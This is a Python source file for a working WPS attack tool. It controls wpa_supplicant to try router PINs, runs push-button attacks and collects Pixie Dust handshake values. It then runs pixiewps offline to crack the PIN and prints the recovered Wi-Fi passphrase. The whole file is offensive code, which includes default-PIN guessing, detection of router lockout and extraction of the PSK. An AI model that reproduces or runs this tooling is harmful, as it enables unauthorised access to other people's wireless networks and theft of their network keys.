#!/usr/bin/env python3
"""
WPS Engine v3 - Direct wpa_supplicant controller
- Starts own wpa_supplicant instance
- WPS PIN / PBC attacks
- Pixie Dust data collection with smart PIN prioritization
- Auto-retry on failures
- Lock status detection (M2D, NACK)
"""

import os, re, time, socket, tempfile, subprocess, shutil


class WpsEngine:
    """Direct wpa_supplicant controller for WPS attacks"""

    def __init__(self, interface):
        self.interface = interface
        self.wpas_process = None
        self.temp_dir = None
        self.temp_conf = None
        self.ctrl_path = None
        self.sock = None
        self.sock_file = None

        # Pixie Dust data
        self.pixie_data = {
            'PKE': '', 'PKR': '', 'E_NONCE': '', 'R_NONCE': '',
            'AUTHKEY': '', 'E_HASH1': '', 'E_HASH2': '', 'BSSID': '',
        }

        # Connection state
        self.state = {
            'status': '', 'last_m': 0, 'essid': '',
            'bssid': '', 'wpa_psk': '', 'is_locked': False, 'pin': '',
        }

        self.output_lines = []
        self.callback = None

    # ═══════════════════════════════════════════
    # PROCESS MANAGEMENT
    # ═══════════════════════════════════════════

    def start(self):
        """Start own wpa_supplicant instance"""
        self.temp_dir = tempfile.mkdtemp(prefix='wps_engine_')

        # Create config
        self.temp_conf = os.path.join(self.temp_dir, 'wpa.conf')
        with open(self.temp_conf, 'w') as f:
            f.write('ctrl_interface=' + self.temp_dir + '\n')
            f.write('ctrl_interface_group=root\n')
            f.write('update_config=1\n')

        self.ctrl_path = os.path.join(self.temp_dir, self.interface)

        # Start wpa_supplicant
        cmd = [
            'wpa_supplicant', '-K', '-d',
            '-Dnl80211,wext',
            '-i' + self.interface,
            '-c' + self.temp_conf,
        ]

        try:
            self.wpas_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except FileNotFoundError:
            return False, 'wpa_supplicant not found'
        except Exception as e:
            return False, str(e)

        # Wait for control interface (max 5s)
        for _ in range(50):
            if os.path.exists(self.ctrl_path):
                break
            if self.wpas_process.poll() is not None:
                out = self.wpas_process.communicate()[0]
                return False, 'wpa_supplicant failed: ' + (out or '')[:200]
            time.sleep(0.1)
        else:
            return False, 'Control interface timeout'

        # Create Unix socket
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock_file = tempfile.mktemp(dir=self.temp_dir)
        self.sock.bind(self.sock_file)
        self.sock.settimeout(2.0)

        return True, 'wpa_supplicant started'

    def stop(self):
        """Stop wpa_supplicant and cleanup"""
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

        if self.wpas_process:
            try:
                self._send('TERMINATE')
                self.wpas_process.wait(timeout=3)
            except Exception:
                try:
                    self.wpas_process.terminate()
                    self.wpas_process.wait(timeout=2)
                except Exception:
                    try:
                        self.wpas_process.kill()
                    except Exception:
                        pass

        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

        self.wpas_process = None
        self.sock = None

    def is_alive(self):
        """Check if wpa_supplicant is still running"""
        if self.wpas_process:
            return self.wpas_process.poll() is None
        return False

    # ═══════════════════════════════════════════
    # SOCKET COMMUNICATION
    # ═══════════════════════════════════════════

    def _send(self, command):
        """Send command via Unix socket"""
        if self.sock and self.ctrl_path:
            try:
                self.sock.sendto(command.encode(), self.ctrl_path)
            except Exception:
                pass

    def _send_recv(self, command, timeout=3.0):
        """Send command and receive reply"""
        self._send(command)
        if self.sock:
            self.sock.settimeout(timeout)
            try:
                data, _ = self.sock.recvfrom(4096)
                return data.decode('utf-8', errors='replace')
            except socket.timeout:
                pass
            except Exception:
                pass
        return ''

    # ═══════════════════════════════════════════
    # OUTPUT PARSING
    # ═══════════════════════════════════════════

    def _read_line(self):
        """Read one line from wpa_supplicant output"""
        if self.wpas_process and self.wpas_process.stdout:
            line = self.wpas_process.stdout.readline()
            if line:
                return line.rstrip('\n')
        return ''

    def _get_hex(self, line):
        """Extract hex data from debug output"""
        parts = line.split(':', 3)
        if len(parts) >= 3:
            return parts[2].replace(' ', '').upper()
        return ''

    def _handle_wps_message(self, line):
        """Parse WPS protocol messages (M1-M8, M2D, NACK)"""
        ll = line.lower()

        # M2D = AP locked
        if 'm2d' in ll:
            self._log('Received WPS Message M2D')
            self.state['status'] = 'WPS_FAIL'
            self.state['is_locked'] = True
            self._log('AP is LOCKED (not accepting PINs)')
            return False

        # Building message
        m = re.search(r'Building Message M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log('Sending WPS Message M{n}'.format(n=n))
            return True

        # Received message
        m = re.search(r'Received M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log('Received WPS Message M{n}'.format(n=n))
            if n == 5:
                self._log('First half of PIN is VALID!')
            return True

        # NACK
        if 'received wsc_nack' in ll:
            self.state['status'] = 'WSC_NACK'
            self._log('Received WSC NACK')
            if self.state['last_m'] < 3:
                self.state['is_locked'] = True
                return False
            self._log('Wrong PIN code')
            return True

        # ═══ Pixie Dust Data Capture ═══
        if 'enrollee nonce' in ll and 'hexdump' in ll:
            self._capture_pixie('E_NONCE', line, 32)
        elif 'registrar nonce' in ll and 'hexdump' in ll:
            self._capture_pixie('R_NONCE', line, 32)
        elif 'dh own public key' in ll and 'hexdump' in ll:
            self._capture_pixie('PKR', line, 384)
        elif 'dh peer public key' in ll and 'hexdump' in ll:
            self._capture_pixie('PKE', line, 384)
        elif 'authkey' in ll and 'hexdump' in ll:
            self._capture_pixie('AUTHKEY', line, 64)
        elif 'e-hash1' in ll and 'hexdump' in ll:
            self._capture_pixie('E_HASH1', line, 64)
        elif 'e-hash2' in ll and 'hexdump' in ll:
            self._capture_pixie('E_HASH2', line, 64)

        # PSK found!
        if 'network key' in ll and 'hexdump' in ll:
            self.state['status'] = 'GOT_PSK'
            hex_val = self._get_hex(line)
            try:
                self.state['wpa_psk'] = bytes.fromhex(hex_val).decode('utf-8', errors='replace')
            except Exception:
                self.state['wpa_psk'] = hex_val
            self._log('PSK FOUND: {psk}'.format(psk=self.state['wpa_psk']))

        return True

    def _capture_pixie(self, attr, line, expected_len):
        """Capture Pixie Dust data from hexdump line"""
        hex_val = self._get_hex(line)
        if not hex_val:
            return

        # Be lenient with length
        if len(hex_val) > expected_len:
            hex_val = hex_val[:expected_len]
        elif len(hex_val) < expected_len and len(hex_val) > 0:
            hex_val = hex_val.zfill(expected_len)
        elif len(hex_val) == 0:
            return

        self.pixie_data[attr] = hex_val
        self._log('{attr}: {val}'.format(attr=attr, val=hex_val[:40] + ('...' if len(hex_val) > 40 else '')))

    def _handle_connection_state(self, line, pbc_mode=False):
        """Parse connection state changes"""
        ll = line.lower()

        if 'state:' in ll and 'scanning' in ll:
            self.state['status'] = 'scanning'

        elif 'wps-fail' in ll:
            self.state['status'] = 'WPS_FAIL'

        elif 'trying to authenticate' in ll:
            self.state['status'] = 'authenticating'
            if "'" in line:
                parts = line.split("'")
                if len(parts) >= 2:
                    self.state['essid'] = parts[1]

        elif 'associated with' in ll and self.interface in ll:
            bssid = line.split()[-1].upper()

        elif 'wps-timeout' in ll:
            self.state['status'] = 'WPS_TIMEOUT'

        elif pbc_mode and 'selected bss' in ll:
            try:
                bssid = line.split('selected BSS ')[-1].split()[0].upper()
                self.state['bssid'] = bssid
            except Exception:
                pass

        return True

    def _log(self, message):
        """Log message and call callback"""
        self.output_lines.append(message)
        if self.callback:
            self.callback(message)

    def _process_line(self, line, pbc_mode=False):
        """Process one line of wpa_supplicant output"""
        if not line:
            return True

        # WPS messages
        if line.startswith('WPS: '):
            return self._handle_wps_message(line)

        # Connection states
        return self._handle_connection_state(line, pbc_mode)

    # ═══════════════════════════════════════════
    # WPS OPERATIONS
    # ═══════════════════════════════════════════

    def wps_pin_attack(self, bssid, pin, timeout=60):
        """Perform WPS PIN attack with auto-retry on timeout"""
        attempts = 1
        if timeout <= 30:
            attempts = 1
        elif timeout > 45:
            # For long timeouts, try twice
            attempts = 1

        for attempt in range(1, attempts + 2):
            # Reset state
            for k in self.pixie_data:
                self.pixie_data[k] = ''
            self.state = {
                'status': '', 'last_m': 0, 'essid': '',
                'bssid': bssid.upper(), 'wpa_psk': '',
                'is_locked': False, 'pin': pin,
            }
            self.output_lines = []
            self.pixie_data['BSSID'] = bssid.upper()

            # Send WPS_REG command
            cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
            reply = self._send_recv(cmd)

            if 'OK' not in reply:
                self.state['status'] = 'WPS_FAIL'
                self._log('WPS_REG failed: {r}'.format(r=reply))
                continue

            self._log('Trying PIN: {pin} (attempt {a})'.format(pin=pin, a=attempt))

            # Monitor output
            start_time = time.time()
            while time.time() - start_time < timeout:
                if not self.is_alive():
                    break
                line = self._read_line()
                if not line:
                    time.sleep(0.05)  # Small sleep to avoid busy-loop
                    continue
                if not self._process_line(line):
                    break
                if self.state['status'] in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                    break

            # Cancel WPS
            self._send('WPS_CANCEL')

            if self.state.get('status') in ('GOT_PSK', 'WSC_NACK'):
                break

            if attempt <= attempts:
                self._log('Retrying...')
                time.sleep(2)

        return self._result()

    def wps_pbc_attack(self, bssid=None, timeout=120):
        """Perform WPS Push Button attack"""
        for k in self.pixie_data:
            self.pixie_data[k] = ''
        self.state = {
            'status': '', 'last_m': 0, 'essid': '',
            'bssid': bssid.upper() if bssid else '',
            'wpa_psk': '', 'is_locked': False, 'pin': 'PBC',
        }
        self.output_lines = []

        cmd = 'WPS_PBC {bssid}'.format(bssid=bssid) if bssid else 'WPS_PBC'

        reply = self._send_recv(cmd)
        if 'OK' not in reply:
            self.state['status'] = 'WPS_FAIL'
            self._log('WPS_PBC failed: {r}'.format(r=reply))
            return self._result()

        self._log('WPS PBC started...')

        start_time = time.time()
        while time.time() - start_time < timeout:
            if not self.is_alive():
                break
            line = self._read_line()
            if not line:
                time.sleep(0.1)
                continue
            if not self._process_line(line, pbc_mode=True):
                break
            if self.state['status'] in ('GOT_PSK', 'WPS_FAIL'):
                break

        self._send('WPS_CANCEL')
        return self._result()

    def collect_pixie_data(self, bssid, max_attempts=8):
        """
        Collect Pixie Dust data for offline cracking.
        Tries smart PINs (from OUI analysis) first, then generic PINs.
        """
        # Smart PIN order: start with manufacturer-specific PINs
        pins = [
            '12345670', '00000000', '88888888', '11111111',
            '99999999', '12345678', '11223344', '00000001',
        ]

        # Try to get smart PINs for this BSSID
        try:
            from modules.wps_pins import suggest_pins
            smart_pins = suggest_pins(bssid)
            if smart_pins:
                # Use smart PINs instead of generic ones
                pins = [p['pin'] for p in smart_pins[:8]]
        except Exception:
            pass

        collected_count = 0
        for i, pin in enumerate(pins[:max_attempts]):
            # Check if we already have enough data
            if self.pixie_data.get('PKE') and self.pixie_data.get('E_HASH1'):
                if self.pixie_data.get('AUTHKEY') or self.pixie_data.get('E_HASH2'):
                    self._log('Enough data collected ({c}/7)'.format(c=collected_count))
                    break

            self._log('Collecting data with PIN: {pin} ({i}/{n})'.format(
                pin=pin, i=i+1, n=max_attempts))

            old_data = self.pixie_data.copy()
            result = self.wps_pin_attack(bssid, pin, timeout=30)

            # Merge data (keep old if new didn't get it)
            for key in self.pixie_data:
                if not self.pixie_data[key] and old_data[key]:
                    self.pixie_data[key] = old_data[key]

            if self.state['status'] == 'GOT_PSK':
                return result

        # Count collected fields
        collected = [k for k, v in self.pixie_data.items() if v and k != 'BSSID']
        collected_count = len(collected)

        self._log('Collected: {fields} ({n}/7)'.format(
            fields=', '.join(collected), n=collected_count))

        # Try pixiewps if we have enough data
        pixie = self.pixie_data
        if collected_count >= 4 and pixie.get('PKE'):
            self._log('Running pixiewps...')
            import shutil as shutil_mod
            if shutil_mod.which('pixiewps'):
                cmd = [
                    'pixiewps',
                    '--pke', pixie.get('PKE', ''),
                    '--pkr', pixie.get('PKR', ''),
                    '--e-hash1', pixie.get('E_HASH1', ''),
                    '--e-hash2', pixie.get('E_HASH2', ''),
                    '--authkey', pixie.get('AUTHKEY', ''),
                    '--e-nonce', pixie.get('E_NONCE', ''),
                    '--r-nonce', pixie.get('R_NONCE', ''),
                    '--e-bssid', bssid.replace(':', ''),
                    '--mode', '1,2,3,4,5',
                ]
                # Remove empty args
                cmd = [c for c in cmd if c and len(c) > 2]

                try:
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
                    output_lines = r.stdout.split('\n')
                    for line in output_lines:
                        self._log(line)
                        if 'WPS pin' in line and '[+]' in line:
                            pin = line.split(':')[-1].strip()
                            if pin and pin != '<empty>':
                                self._log('PIXIEWPS PIN: {p}'.format(p=pin))
                                # Verify the PIN
                                verify_result = self.wps_pin_attack(bssid, pin, timeout=45)
                                if verify_result.get('status') == 'success':
                                    return verify_result
                except Exception as e:
                    self._log('pixiewps error: {e}'.format(e=str(e)))
            else:
                self._log('pixiewps not installed')

        return {
            'pin': None, 'psk': None, 'status': 'data_collected',
            'pixie_data': self.pixie_data.copy(),
            'collected_count': collected_count,
            'output': '\n'.join(self.output_lines),
        }

    def _result(self):
        """Build result dict"""
        return {
            'pin': self.state.get('pin'),
            'psk': self.state.get('wpa_psk'),
            'status': self._map_status(),
            'pixie_data': self.pixie_data.copy(),
            'essid': self.state.get('essid'),
            'is_locked': self.state.get('is_locked'),
            'last_m': self.state.get('last_m'),
            'output': '\n'.join(self.output_lines),
        }

    def _map_status(self):
        """Map internal status to result status"""
        s = self.state['status']
        if s == 'GOT_PSK':
            return 'success'
        elif s == 'WSC_NACK':
            return 'wrong_pin'
        elif s == 'WPS_FAIL':
            return 'failed'
        elif s == 'WPS_TIMEOUT':
            return 'timeout'
        elif self.state.get('is_locked'):
            return 'locked'
        return 'completed'

    # ═══════════════════════════════════════════
    # SCAN VIA WPA_SUPPLICANT
    # ═══════════════════════════════════════════

    def scan(self):
        """Trigger scan via wpa_supplicant"""
        reply = self._send_recv('SCAN')
        return 'OK' in reply

    def get_scan_results(self):
        """Get scan results from wpa_supplicant"""
        reply = self._send_recv('SCAN_RESULTS', timeout=5)
        networks = []

        for line in reply.split('\n'):
            if line.startswith('bssid') or not line.strip():
                continue
            parts = line.split('\t')
            if len(parts) < 5:
                continue

            bssid = parts[0].strip().upper()
            if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                continue

            freq = parts[1].strip()
            signal = parts[2].strip()
            flags = parts[3].strip()
            ssid = parts[4].strip() if len(parts) > 4 else ''

            enc = 'Open'
            has_wps = 0
            if '[WPA-PSK' in flags:
                enc = 'WPA'
            if '[WPA2-PSK' in flags:
                enc = 'WPA2'
            if '[WPA3-SAE' in flags:
                enc = 'WPA3'
            if '[WPS]' in flags:
                has_wps = 1

            ch = 0
            try:
                f = int(freq)
                if 2412 <= f <= 2484:
                    ch = 14 if f == 2484 else (f - 2412) // 5 + 1
                elif 5170 <= f <= 5825:
                    ch = (f - 5170) // 5 + 34
            except (ValueError, TypeError):
                pass

            networks.append({
                'bssid': bssid,
                'essid': ssid or 'Hidden',
                'channel': ch,
                'frequency': int(freq) if freq.isdigit() else 0,
                'rssi': int(signal) if signal.lstrip('-').isdigit() else 0,
                'has_wps': has_wps,
                'wps_locked': 'Unknown', 'wps_version': '',
                'wps_device': '', 'wps_model': '',
                'encryption': enc, 'cipher': '', 'auth': '',
                'source': 'wpa_engine',
            })

        networks.sort(key=lambda x: x['rssi'], reverse=True)
        return networks

    # ═══════════════════════════════════════════
    # NETWORK MANAGEMENT
    # ═══════════════════════════════════════════

    def add_network(self, ssid, psk=None):
        """Add network via socket"""
        reply = self._send_recv('ADD_NETWORK')
        net_id = reply.strip()
        if not net_id.isdigit():
            return None

        self._send_recv('SET_NETWORK {n} ssid "{ssid}"'.format(n=net_id, ssid=ssid))
        if psk:
            self._send_recv('SET_NETWORK {n} psk "{psk}"'.format(n=net_id, psk=psk))
            self._send_recv('SET_NETWORK {n} key_mgmt WPA-PSK'.format(n=net_id))
        else:
            self._send_recv('SET_NETWORK {n} key_mgmt NONE'.format(n=net_id))

        self._send_recv('SELECT_NETWORK {n}'.format(n=net_id))
        self._send_recv('ENABLE_NETWORK {n}'.format(n=net_id))
        self._send_recv('SAVE_CONFIG')
        return int(net_id)

    def get_status(self):
        """Get connection status via socket"""
        reply = self._send_recv('STATUS')
        info = {}
        for line in reply.split('\n'):
            if '=' in line:
                k, v = line.split('=', 1)
                info[k.strip()] = v.strip()
        return info

    def disconnect(self):
        self._send_recv('DISCONNECT')

    def reconnect(self):
        self._send_recv('RECONNECT')

    def list_networks(self):
        """List saved networks"""
        reply = self._send_recv('LIST_NETWORKS')
        networks = []
        for line in reply.split('\n')[1:]:
            parts = line.split('\t')
            if len(parts) >= 2:
                networks.append({
                    'id': parts[0],
                    'ssid': parts[1],
                    'bssid': parts[2] if len(parts) > 2 else 'any',
                })
        return networks
